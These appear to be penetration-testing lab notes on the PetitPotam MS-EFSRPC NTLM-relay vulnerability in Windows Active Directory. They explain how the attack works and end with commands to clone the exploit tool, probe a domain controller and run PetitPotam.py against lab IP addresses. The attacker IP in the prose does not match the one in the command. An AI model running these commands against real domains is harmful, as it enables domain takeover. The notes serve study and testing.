# PetitPotam (MS-EFSRPC)

## Overview

PetitPotam is a critical vulnerability (CVE-2021-36942) that was discovered in Microsoft Windows' MS-EFSRPC (Microsoft Encrypting File System Remote Protocol), which is used for communication between Windows machines in an Active Directory environment. This vulnerability allows an attacker to escalate privileges or perform NTLM relay attacks by forcing a vulnerable Windows machine to authenticate to an attacker-controlled server, potentially allowing the attacker to gain administrative privileges.If MS-EFSRPC is exposed to the network and is vulnerable, it may be a vector for the attack.

### Overview of PetitPotam (CVE-2021-36942)

- **Vulnerability Type:** NTLM Relay / Authentication Bypass.
- **Impact:** The vulnerability allows attackers to escalate privileges and potentially take over a Windows domain controller, leading to full domain compromise.
- **Discovery Date:** July 2021.
- **Affected Components:**
  - MS-EFSRPC (Microsoft Encrypting File System Remote Protocol)
  - Active Directory Domain Services (AD DS)
  - Other services relying on NTLM authentication.

### How PetitPotam Works:

The vulnerability exists in the way Windows handles NTLM authentication during communication between systems in an Active Directory domain. Specifically, an attacker can use **MS-EFSRPC** to force a machine to authenticate with an attacker-controlled server. By leveraging the NTLM relay attack, an attacker can capture the authentication request and relay it to other machines or services, such as a **domain controller**.

Here's a general breakdown of the attack flow:
1. **MS-EFSRPC Vulnerability:** The attacker sends a specially crafted request to a vulnerable Windows system, triggering the system to use NTLM authentication for communication.
2. **NTLM Relay Attack:** The attacker intercepts the NTLM authentication request and relays it to a target machine (e.g., a domain controller or another Windows machine) that will accept the authentication.
3. **Privilege Escalation:** If successful, the attacker can gain administrative privileges on the target machine, which may include full control of the domain or other services.

### Affected Versions:

PetitPotam affects the following Windows versions and configurations:
- **Windows Server** (including versions used in Active Directory environments).
- **Windows 10** and other systems that may communicate with Windows Server.
- Specifically, any system where MS-EFSRPC is exposed and NTLM authentication is used.

### Attack Scenarios:

1. **Domain Controller Compromise:**
   - An attacker can relay authentication requests to a domain controller and potentially compromise the entire domain.
2. **Privilege Escalation in AD Environments:**
   - By targeting machines that are part of an Active Directory domain, attackers could escalate their privileges from a low-privileged user to an administrator or domain admin.

## Attack Execution

Get the petitpotam git repo:

    git clone https://github.com/topotam/PetitPotam.git

Check for the vulnerability, by testing if MS-EFSRPC is accessible:

    rpcclient -U "" -N <domain_controller_ip> -c "srvinfo"

    or impacket's

    rpcdump <domain_controller_ip>

    or just run the petitpotam python script bellow


Execute the PetitPotam exploit by specifying the IP address of the attack host (172.16.5.255) and the target Domain Controller (172.16.5.5). 

    python3 PetitPotam.py 172.16.5.225 172.16.5.5